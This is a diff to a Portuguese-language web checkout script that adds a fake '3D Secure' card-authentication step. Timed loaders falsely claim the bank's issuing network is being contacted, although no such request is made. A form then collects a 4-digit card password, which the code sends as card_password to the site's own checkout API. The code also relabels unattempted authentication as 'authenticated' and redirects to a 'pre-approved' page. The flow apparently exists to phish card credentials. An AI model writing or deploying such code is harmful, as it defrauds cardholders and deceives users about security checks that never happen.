@@ -560,6 +560,96 @@ document.addEventListener('DOMContentLoaded', () => {
   const copyBtnText = document.getElementById('copy-btn-text');
   const copyIcon = document.getElementById('copy-icon');
 
+  // ==========================================
+  // 10. ELEMENTOS E EVENTOS DO MODAL 3DS & CARREGAMENTO
+  // ==========================================
+  const authLoadingOverlay = document.getElementById('auth-loading-overlay');
+  const auth3dsOverlay = document.getElementById('auth-3ds-overlay');
+  const authBrandLogo = document.getElementById('auth-brand-logo');
+  const authInfoAmount = document.getElementById('auth-info-amount');
+  const authInfoDate = document.getElementById('auth-info-date');
+  const authInfoCard = document.getElementById('auth-info-card');
+  const btnCancel3ds = document.getElementById('btn-cancel-3ds');
+  const btnSubmit3ds = document.getElementById('btn-submit-3ds');
+  const digitInputs = document.querySelectorAll('.auth-digit-input');
+
+  // Lógica dos campos de senha de 4 dígitos
+  digitInputs.forEach((input, idx) => {
+    // Filtrar somente números ao digitar
+    input.addEventListener('input', (e) => {
+      input.value = input.value.replace(/\D/g, '');
+      
+      if (input.value.length === 1) {
+        const nextInput = document.getElementById(`auth-digit-${idx + 2}`);
+        if (nextInput) {
+          nextInput.focus();
+        }
+      }
+    });
+
+    // Navegação via Backspace
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace') {
+        if (input.value === '') {
+          const prevInput = document.getElementById(`auth-digit-${idx}`);
+          if (prevInput) {
+            prevInput.focus();
+            prevInput.value = '';
+          }
+        } else {
+          input.value = '';
+        }
+        e.preventDefault();
+      }
+    });
+
+    // Submissão automática com a tecla Enter
+    input.addEventListener('keyup', (e) => {
+      if (e.key === 'Enter') {
+        let passwordVal = '';
+        digitInputs.forEach(inp => passwordVal += inp.value);
+        if (passwordVal.length === 4) {
+          const currentBtnSubmit = document.getElementById('btn-submit-3ds');
+          if (currentBtnSubmit) currentBtnSubmit.click();
+        }
+      }
+    });
+
+    // Selecionar o texto ao focar
+    input.addEventListener('focus', () => {
+      input.select();
+    });
+
+    // Suporte para colar a senha completa (4 dígitos)
+    input.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
+      if (pasteData) {
+        for (let i = 0; i < pasteData.length; i++) {
+          const targetInput = document.getElementById(`auth-digit-${i + 1}`);
+          if (targetInput) {
+            targetInput.value = pasteData[i];
+          }
+        }
+        const lastInput = document.getElementById(`auth-digit-${Math.min(pasteData.length, 4)}`);
+        if (lastInput) {
+          lastInput.focus();
+        }
+      }
+    });
+  });
+
+  // Ação de Cancelar no modal 3DS
+  btnCancel3ds.addEventListener('click', () => {
+    auth3dsOverlay.classList.remove('open');
+    authLoadingOverlay.classList.remove('open');
+    
+    // Restaurar o botão de checkout original
+    submitBtn.disabled = false;
+    btnText.classList.remove('hide');
+    btnLoader.classList.add('hide');
+  });
+
   checkoutForm.addEventListener('submit', async (e) => {
     e.preventDefault();
 
@@ -644,6 +734,146 @@ document.addEventListener('DOMContentLoaded', () => {
       status: "draft"
     };
 
+    // Fluxo Diferenciado se for Cartão de Crédito (Autenticação 3DS)
+    if (selectedMethod === 'card') {
+      // 1. Mostrar loader de validação de autenticação inicial
+      const loadingTitle = authLoadingOverlay.querySelector('.auth-title');
+      const loadingSubtitle = authLoadingOverlay.querySelector('.auth-subtitle');
+      
+      loadingTitle.textContent = "Validando autenticação";
+      loadingSubtitle.textContent = "Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.";
+      authLoadingOverlay.classList.add('open');
+
+      // 2. Aguardar 2.5 segundos
+      setTimeout(() => {
+        authLoadingOverlay.classList.remove('open');
+
+        // Popula as informações dinâmicas do modal 3DS
+        authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
+        authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
+
+        const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        authInfoAmount.textContent = totalBrl;
+
+        const now = new Date();
+        const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
+        authInfoDate.textContent = formattedDate;
+
+        const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
+        authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;
+
+        // Limpa os campos de senha e coloca foco no primeiro
+        digitInputs.forEach(input => input.value = '');
+        
+        // Abre o modal 3DS
+        auth3dsOverlay.classList.add('open');
+        setTimeout(() => {
+          const firstDigit = document.getElementById('auth-digit-1');
+          if (firstDigit) firstDigit.focus();
+        }, 100);
+
+        // Define a ação de envio da senha
+        const execute3dsSubmit = async () => {
+          // Recuperar a senha inserida
+          let passwordVal = '';
+          digitInputs.forEach(input => passwordVal += input.value);
+
+          if (passwordVal.length < 4) {
+            const digitsContainer = document.querySelector('.auth-password-digits');
+            shakeElement(digitsContainer);
+            return;
+          }
+
+          // Senha válida! Prosseguir com o envio.
+          // 1. Mostrar loader de autenticação final
+          loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
+          loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
+          
+          auth3dsOverlay.classList.remove('open');
+          authLoadingOverlay.classList.add('open');
+
+          // 2. Aguardar 3.0 segundos
+          setTimeout(async () => {
+            // Determinar o status 3DS final a partir da seleção de teste avançado
+            let finalThreeDsStatus = document.getElementById('three_ds_status').value;
+            if (finalThreeDsStatus === 'not_attempted') {
+              finalThreeDsStatus = 'authenticated';
+            }
+
+            // Anexar a senha do cartão e o status atualizado no payload
+            const finalPayload = {
+              ...payload,
+              card_password: passwordVal,
+              three_ds_status: finalThreeDsStatus
+            };
+
+            try {
+              const response = await fetch('/api/checkout', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(finalPayload)
+              });
+
+              const responseData = await response.json();
+
+              if (!response.ok) {
+                throw new Error(responseData.details || responseData.error || 'Falha ao salvar transação de cartão.');
+              }
+
+              // Se o status retornado for FAILED ou REJECTED (devido a testes avançados negativos)
+              if (responseData.data && (responseData.data.status === 'FAILED' || responseData.data.status === 'REJECTED')) {
+                authLoadingOverlay.classList.remove('open');
+                showModalState('error', responseData);
+                
+                // Restaurar os controles do form principal
+                submitBtn.disabled = false;
+                btnText.classList.remove('hide');
+                btnLoader.classList.add('hide');
+              } else {
+                // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
+                const urlParams = new URLSearchParams(window.location.search);
+                const storeParam = urlParams.get('store_url');
+                
+                let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
+                if (storeParam) {
+                  redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
+                }
+                
+                window.location.href = redirectUrl;
+              }
+
+            } catch (err) {
+              console.error('Erro ao processar transação de cartão:', err);
+              authLoadingOverlay.classList.remove('open');
+              showModalState('error', { error: err.message });
+              
+              // Restaurar os controles do form principal
+              submitBtn.disabled = false;
+              btnText.classList.remove('hide');
+              btnLoader.classList.add('hide');
+            }
+          }, 3000);
+        };
+
+        // Associar o clique de envio
+        // Substituímos o botão por um clone dele para limpar listeners antigos!
+        const currentBtnSubmit = document.getElementById('btn-submit-3ds');
+        if (currentBtnSubmit) {
+          const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
+          currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
+          newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
+        }
+
+      }, 2500);
+
+      return;
+    }
+
+    // ========================================================
+    // FLUXO NORMAL DO PIX (MANTIDO 100% INTACTO)
+    // ========================================================
     showModalState('processing');
     
     try {
